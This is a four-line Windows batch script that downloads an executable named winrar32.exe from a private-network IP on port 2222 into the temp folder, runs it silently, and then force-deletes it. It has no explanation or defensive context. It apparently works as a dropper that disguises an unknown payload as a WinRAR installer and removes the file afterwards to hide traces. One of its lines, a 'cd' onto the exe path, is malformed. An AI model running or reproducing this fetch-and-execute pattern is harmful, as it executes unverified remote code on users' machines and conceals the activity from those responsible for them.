@echo
curl -o %temp%\winrar32.exe http://192.168.1.10:2222/winrar32.exe
cd %temp%\winrar32.exe & winrar32.exe /S
del /f "%temp%\winrar32.exe"
